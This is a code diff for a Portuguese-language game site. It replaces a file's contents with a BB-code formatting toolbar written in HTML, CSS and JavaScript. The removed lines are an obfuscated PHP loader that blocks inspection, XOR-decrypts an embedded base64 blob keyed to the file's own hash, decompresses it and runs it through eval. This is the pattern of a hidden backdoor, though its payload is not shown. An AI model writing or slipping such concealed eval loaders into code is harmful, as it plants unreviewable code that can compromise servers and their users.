@@ -1,24 +1,223 @@
-<?php
-$lrmaiba="9dc8fc88ad86ab9dda9fc74d344f4381";
-$lgipdmmmrw="0a07050803505e0a51505c03055b005d07545c0701560d050552035100065d52";
-$jglcslenec="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";
-$xiapfsl=file_get_contents(__FILE__);
-$fbitauy=str_replace($jglcslenec,"",$xiapfsl);
-if(strpos($fbitauy,"ec"."ho")!==false||strpos($fbitauy,"pr"."int")!==false||strpos($fbitauy,"var_"."dump")!==false||strpos($fbitauy,"file_put_"."contents")!==false||strpos($fbitauy,"fw"."rite")!==false){die();}
-$riwbgmx=str_replace(array($lrmaiba,$lgipdmmmrw),array("SP_b9404fdf","KP_3ee09578"),$xiapfsl);
-$wkqdtosi=md5($riwbgmx);
-$nnzkplqd=hex2bin($lgipdmmmrw);
-$ezctxeru="";
-$wtakptk=strlen($wkqdtosi);
-for($psvdmhzhb=0;$psvdmhzhb<$wtakptk;$psvdmhzhb++){
-$ezctxeru.=chr(ord($nnzkplqd[$psvdmhzhb])^ord($wkqdtosi[$psvdmhzhb]));
-}
-$ueanhgpg=base64_decode($jglcslenec);
-$ujlajxzzue=strlen($ueanhgpg);
-$zxzcrqcpv="";
-$kjiccx=strlen($ezctxeru);
-for($psvdmhzhb=0;$psvdmhzhb<$ujlajxzzue;$psvdmhzhb++){
-$zxzcrqcpv.=$ueanhgpg[$psvdmhzhb]^$ezctxeru[$psvdmhzhb%$kjiccx];
-}
-$rjzvldpvqru="gzun"."compress";
-eval('?>' . $rjzvldpvqru($zxzcrqcpv) . '<?php ');
+<!-- BB Code Editor Bar -->
+<div class="bb_bar" style="background-color: #f4e4bc; padding: 5px; border: 1px solid #c0a070; margin-bottom: 5px;">
+    <button type="button" class="bb_button" onclick="insertBBCode('b')" title="Negrito">
+        <strong>B</strong>
+    </button>
+    <button type="button" class="bb_button" onclick="insertBBCode('i')" title="Itálico">
+        <em>I</em>
+    </button>
+    <button type="button" class="bb_button" onclick="insertBBCode('u')" title="Sublinhado">
+        <u>U</u>
+    </button>
+    <button type="button" class="bb_button" onclick="insertBBCode('s')" title="Riscado">
+        <s>S</s>
+    </button>
+
+    <span style="margin: 0 5px;">|</span>
+
+    <button type="button" class="bb_button" onclick="insertBBCode('quote')" title="Citação">
+        💬 Quote
+    </button>
+    <button type="button" class="bb_button" onclick="insertBBCode('code')" title="Código">
+        &lt;/&gt; Code
+    </button>
+    <button type="button" class="bb_button" onclick="insertBBCode('list')" title="Lista">
+        ≡ List
+    </button>
+
+    <span style="margin: 0 5px;">|</span>
+
+    <button type="button" class="bb_button" onclick="insertBBCode('url')" title="Link">
+        🔗 URL
+    </button>
+    <button type="button" class="bb_button" onclick="insertBBCode('player')" title="Jogador">
+        👤 Player
+    </button>
+    <button type="button" class="bb_button" onclick="insertBBCode('tribe')" title="Tribo">
+        🛡️ Tribe
+    </button>
+    <button type="button" class="bb_button" onclick="insertBBCode('coord')" title="Coordenadas">
+        📍 Coord
+    </button>
+
+    <span style="margin: 0 5px;">|</span>
+
+    <select onchange="insertColor(this.value); this.selectedIndex=0;" class="bb_select">
+        <option value="">Cor</option>
+        <option value="red" style="color: red;">Vermelho</option>
+        <option value="blue" style="color: blue;">Azul</option>
+        <option value="green" style="color: green;">Verde</option>
+        <option value="yellow" style="color: #DAA520;">Amarelo</option>
+        <option value="orange" style="color: orange;">Laranja</option>
+        <option value="purple" style="color: purple;">Roxo</option>
+        <option value="brown" style="color: brown;">Castanho</option>
+        <option value="black" style="color: black;">Preto</option>
+        <option value="gray" style="color: gray;">Cinzento</option>
+    </select>
+
+    <select onchange="insertSize(this.value); this.selectedIndex=0;" class="bb_select">
+        <option value="">Tamanho</option>
+        <option value="8">Muito pequeno</option>
+        <option value="10">Pequeno</option>
+        <option value="12">Normal</option>
+        <option value="14">Grande</option>
+        <option value="18">Muito grande</option>
+        <option value="24">Enorme</option>
+    </select>
+</div>
+
+<style>
+    .bb_button {
+        background-color: #fff;
+        border: 1px solid #c0a070;
+        padding: 3px 8px;
+        margin: 0 2px;
+        cursor: pointer;
+        font-size: 12px;
+    }
+
+    .bb_button:hover {
+        background-color: #f0e0c0;
+    }
+
+    .bb_button:active {
+        background-color: #e0d0b0;
+    }
+
+    .bb_select {
+        background-color: #fff;
+        border: 1px solid #c0a070;
+        padding: 3px 5px;
+        margin: 0 2px;
+        font-size: 12px;
+        cursor: pointer;
+    }
+
+    .quote {
+        background-color: #f9f9f9;
+        border-left: 3px solid #c0a070;
+        padding: 10px;
+        margin: 10px 0;
+        font-style: italic;
+    }
+
+    .code {
+        background-color: #f4f4f4;
+        border: 1px solid #ddd;
+        padding: 10px;
+        margin: 10px 0;
+        font-family: 'Courier New', monospace;
+        overflow-x: auto;
+    }
+</style>
+
+<script>
+    // Get the active textarea (set this ID when including the BB bar)
+    var activeTextarea = '<?= $textareaId ?? "content" ?>';
+
+    function insertBBCode(tag) {
+        var textarea = document.getElementById(activeTextarea);
+        if (!textarea) return;
+
+        var start = textarea.selectionStart;
+        var end = textarea.selectionEnd;
+        var selectedText = textarea.value.substring(start, end);
+        var beforeText = textarea.value.substring(0, start);
+        var afterText = textarea.value.substring(end);
+
+        var insertText = '';
+
+        switch (tag) {
+            case 'b':
+            case 'i':
+            case 'u':
+            case 's':
+                insertText = '[' + tag + ']' + (selectedText || 'texto') + '[/' + tag + ']';
+                break;
+            case 'quote':
+                insertText = '[quote]' + (selectedText || 'texto citado') + '[/quote]';
+                break;
+            case 'code':
+                insertText = '[code]' + (selectedText || 'código') + '[/code]';
+                break;
+            case 'list':
+                insertText = '[list]\n[*]Item 1\n[*]Item 2\n[*]Item 3\n[/list]';
+                break;
+            case 'url':
+                var url = prompt('Insira o URL:', 'http://');
+                if (url) {
+                    insertText = '[url=' + url + ']' + (selectedText || 'link') + '[/url]';
+                }
+                break;
+            case 'player':
+                var player = prompt('Nome do jogador:', selectedText || '');
+                if (player) {
+                    insertText = '[player]' + player + '[/player]';
+                }
+                break;
+            case 'tribe':
+                var tribe = prompt('Nome da tribo:', selectedText || '');
+                if (tribe) {
+                    insertText = '[tribe]' + tribe + '[/tribe]';
+                }
+                break;
+            case 'coord':
+                var coord = prompt('Coordenadas (xxx|yyy):', selectedText || '500|500');
+                if (coord) {
+                    insertText = '[coord]' + coord + '[/coord]';
+                }
+                break;
+        }
+
+        if (insertText) {
+            textarea.value = beforeText + insertText + afterText;
+            textarea.focus();
+
+            // Set cursor position after inserted text
+            var newPos = start + insertText.length;
+            textarea.setSelectionRange(newPos, newPos);
+        }
+    }
+
+    function insertColor(color) {
+        if (!color) return;
+
+        var textarea = document.getElementById(activeTextarea);
+        if (!textarea) return;
+
+        var start = textarea.selectionStart;
+        var end = textarea.selectionEnd;
+        var selectedText = textarea.value.substring(start, end);
+        var beforeText = textarea.value.substring(0, start);
+        var afterText = textarea.value.substring(end);
+
+        var insertText = '[color=' + color + ']' + (selectedText || 'texto') + '[/color]';
+
+        textarea.value = beforeText + insertText + afterText;
+        textarea.focus();
+
+        var newPos = start + insertText.length;
+        textarea.setSelectionRange(newPos, newPos);
+    }
+
+    function insertSize(size) {
+        if (!size) return;
+
+        var textarea = document.getElementById(activeTextarea);
+        if (!textarea) return;
+
+        var start = textarea.selectionStart;
+        var end = textarea.selectionEnd;
+        var selectedText = textarea.value.substring(start, end);
+        var beforeText = textarea.value.substring(0, start);
+        var afterText = textarea.value.substring(end);
+
+        var insertText = '[size=' + size + ']' + (selectedText || 'texto') + '[/size]';
+
+        textarea.value = beforeText + insertText + afterText;
+        textarea.focus();
+
+        var newPos = start + insertText.length;
+        textarea.setSelectionRange(newPos, newPos);
+    }
+</script>
